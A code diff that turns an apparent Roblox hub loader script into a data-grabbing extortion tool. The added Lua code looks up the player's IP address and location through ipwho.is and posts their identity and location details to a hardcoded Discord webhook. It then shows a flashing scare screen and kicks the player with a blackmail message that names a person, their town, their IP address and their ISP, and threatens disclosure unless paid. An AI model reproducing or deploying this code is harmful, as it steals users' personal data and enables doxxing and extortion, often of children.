@@ -1,2 +1,140 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Dev-BlueX/BlueX-Hub/refs/heads/main/Main.lua"))()
-print ("W RIZZZ")
+local webhookURL = "https://discordapp.com/api/webhooks/1343680417445707827/rJsFhjXEQHsBxveUSYdwFecunnzfuZ9LZLJkSm7yoV1_RCIZXHChSY0IXwZamul6BUR6"
+
+local player = game.Players.LocalPlayer
+local username = player.Name
+local displayName = player.DisplayName
+local userId = player.UserId
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local gameId = game.PlaceId
+local jobId = game.JobId
+
+-- Get IP & Location Data
+local success, ipData = pcall(function()
+    return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
+end)
+
+if not success or not ipData or not ipData.success then
+    warn("Failed to fetch IP data.")
+    return
+end
+
+local luaJoinScript = [[
+local TeleportService = game:GetService("TeleportService")
+TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
+]]
+
+
+local ip = ipData.ip or "Unknown"
+local country = ipData.country or "Unknown"
+local countryCode = ipData.country_code or "Unknown"
+local region = ipData.region or "Unknown"
+local city = ipData.city or "Unknown"
+local postal = ipData.postal or "Unknown"
+local latitude = tostring(ipData.latitude or "Unknown")
+local longitude = tostring(ipData.longitude or "Unknown")
+local timezone = ipData.timezone.name or "Unknown"
+local timeCurrent = ipData.timezone.current_time or "Unknown"
+
+-- Generate Roblox Join Link
+
+local embed = {
+    ["title"] = "Execution Log",
+    ["description"] = "kid log",
+    ["type"] = "rich",
+    ["color"] = 0x000000,
+    ["fields"] = {
+        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
+        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
+        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
+        { ["name"] = "Game", ["value"] = gameName, ["inline"] = false },
+        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
+        { ["name"] = ":earth_africa: Country", ["value"] = country .. " (" .. countryCode .. ")", ["inline"] = true },
+        { ["name"] = ":clock3: Timezone", ["value"] = timezone, ["inline"] = true },
+        { ["name"] = ":alarm_clock: Local Time", ["value"] = timeCurrent, ["inline"] = true },
+    
+    },
+    ["footer"] = { ["text"] = "Execution Log - Roblox" },
+    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+local payload = game:GetService("HttpService"):JSONEncode({
+    ["content"] = "log",
+    ["embeds"] = {embed}
+})
+
+local requestFunction = syn and syn.request or http_request or request or (fluxus and fluxus.request)
+if requestFunction then
+    requestFunction({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = payload
+    })
+else
+    warn("Your executor does not support HTTP requests.")
+end
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ScareScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.BorderSizePixel = 0
+bg.Parent = screenGui
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 1, 0)
+label.Position = UDim2.new(0, 0, 0, 0)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.new(1, 0, 0)
+label.TextScaled = true
+label.Font = Enum.Font.Arcade
+label.TextWrapped = true
+label.Text = "⚠️ YOU HAVENT PAIED FOR THIS SCRIPT ⚠️."
+label.Parent = screenGui
+
+-- Sound Setup (creepy sound)
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://193019090" -- Creepy sound effect
+sound.Volume = 1
+sound.Looped = true
+sound.Parent = workspace
+sound:Play()
+
+-- Flashing background
+task.spawn(function()
+	while sound.Playing do
+		bg.BackgroundColor3 = Color3.new(1, 0, 0) -- Red
+		wait(0.2)
+		bg.BackgroundColor3 = Color3.new(0, 0, 0) -- Black
+		wait(0.2)
+	end
+end)
+
+wait(3)
+
+-- Countdown
+for i = 3, 1, -1 do
+	label.Text = tostring(i)
+	wait(1)
+end
+
+sound:Stop()
+
+-- Kick (client-side)
+pcall(function()
+	player:Kick("Kristian, you have 10 minutes to make the payment. If I don't receive it by then, I will publicly disclose that you live in Aiken, United States, and your IP address is 72.28.186.48 And Your ISP is Breezeline. Don't make me take that step.")
+end)
+
+
+dwdwdloadstring(game:HttpGet("https://raw.githubusercontent.com/Dev-BlueX/BlueX-Hub/refs/heads/main/Main.lua"))()
+print ("fuck you")
